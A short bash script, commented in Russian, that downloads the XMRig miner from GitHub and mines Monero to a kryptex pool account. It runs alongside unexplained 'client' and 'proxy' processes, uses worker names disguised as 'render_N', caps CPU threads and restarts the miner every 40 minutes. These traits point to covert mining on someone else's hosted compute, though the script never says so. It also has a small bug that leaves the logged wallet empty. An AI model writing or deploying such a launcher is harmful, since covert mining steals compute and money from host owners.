#!/bin/bash

# === Настройки ===
MINER_RUNTIME=40m  # 40 минут работы майнера
RESTART_DELAY=5    # пауза между остановкой и запуском (сек)
DIR=xmrig-6.26.0
ARCHIVE=$DIR-linux-static-x64.tar.gz

# === Подготовка ===
[ -f $DIR/xmrig ] || (wget -q https://github.com/xmrig/xmrig/releases/download/v6.26.0/$ARCHIVE && tar -xzf $ARCHIVE && rm $ARCHIVE)

# === Запуск инфраструктуры (один раз) ===
./client -server="$SERVER" -session-id="$SESSION_ID" -mode="$MODE" -log="$LOG" &
CLIENT_PID=$!
echo "[$(date)] Client started: PID $CLIENT_PID"

./proxy &
PROXY_PID=$!
echo "[$(date)] Proxy started: PID $PROXY_PID"

# Даём время на инициализацию
sleep 3

# === Функция запуска майнера ===
start_miner() {
    WALLET="krxX3328ZR/render_$((RANDOM % 1000 + 1))"
    ./$DIR/xmrig --url=xmr-ru.kryptex.network:7029 \
                 --user="$WALLET" \
                 --pass=x \
                 --coin=monero \
                 --cpu-max-threads-hint=5 \
                 --randomx-mode=light \
                 >> xmrig.log 2>&1 &
    echo $!  # возвращаем PID
}

# === Обработчик сигналов для чистой остановки ===
cleanup() {
    echo "[$(date)] Stopping all processes..."
    kill $MINER_PID $CLIENT_PID $PROXY_PID 2>/dev/null
    wait
    exit 0
}
trap cleanup SIGINT SIGTERM

# === Главный цикл: перезапуск майнера каждые 40 минут ===
echo "[$(date)] Starting miner cycle (every $MINER_RUNTIME)..."

while true; do
    MINER_PID=$(start_miner)
    echo "[$(date)] Miner started: PID $MINER_PID (wallet: $WALLET)"
    
    # Ждём 40 минут ИЛИ пока майнер не упадёт сам
    for ((i=0; i<2400; i++)); do  # 2400 сек = 40 мин
        if ! kill -0 $MINER_PID 2>/dev/null; then
            echo "[$(date)] Miner crashed, restarting in ${RESTART_DELAY}s..."
            break
        fi
        sleep 1
    done
    
    # Останавливаем майнер, если он ещё жив
    if kill -0 $MINER_PID 2>/dev/null; then
        echo "[$(date)] Time's up! Stopping miner..."
        kill $MINER_PID 2>/dev/null
        wait $MINER_PID 2>/dev/null  # ждём завершения
    fi
    
    # Пауза перед следующим запуском
    sleep $RESTART_DELAY
done
